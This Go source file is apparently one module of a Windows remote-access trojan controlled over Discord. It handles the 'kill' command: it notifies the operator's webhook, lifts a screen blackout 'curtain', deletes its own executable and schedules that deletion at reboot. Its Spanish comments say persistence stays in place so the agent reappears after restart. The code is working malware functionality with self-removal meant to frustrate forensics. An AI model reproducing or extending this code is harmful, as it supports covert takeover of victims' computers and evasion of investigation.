//go:build windows

package commands

import (
	"os"
	"time"
	"unsafe"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
	"golang.org/x/sys/windows"
)

var procMoveFileExW = windows.NewLazySystemDLL("kernel32.dll").NewProc("MoveFileExW")

// Kill apaga el agente sin limpiar persistencia. El agente reaparecerá al
// reiniciar la máquina.
func Kill(s *discordgo.Session, i *discordgo.InteractionCreate) {
	_ = Reply(s, i, "⏻ Agente finalizado.")
	_ = util.PostWebhook("⛔ Agente apagado", 10038562, webhookFields(
		util.EmbedField{Name: "acción", Value: "kill", Inline: true},
	))

	// Matar el agente con la cortina puesta deja la máquina sin desbloqueo
	// remoto: los centinelas la mantienen negra y nadie puede mandar la orden.
	EnsureUnlocked()

	exe, err := os.Executable()
	if err == nil {
		if removeErr := os.Remove(exe); removeErr != nil {
			scheduleDelete(exe)
		}
	}

	time.Sleep(500 * time.Millisecond)
	os.Exit(0)
}

// scheduleDelete marca el archivo para borrarse en el próximo reinicio.
func scheduleDelete(path string) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	procMoveFileExW.Call(uintptr(unsafe.Pointer(pathPtr)), 0, 0x00000004) // MOVEFILE_DELAY_UNTIL_REBOOT
}
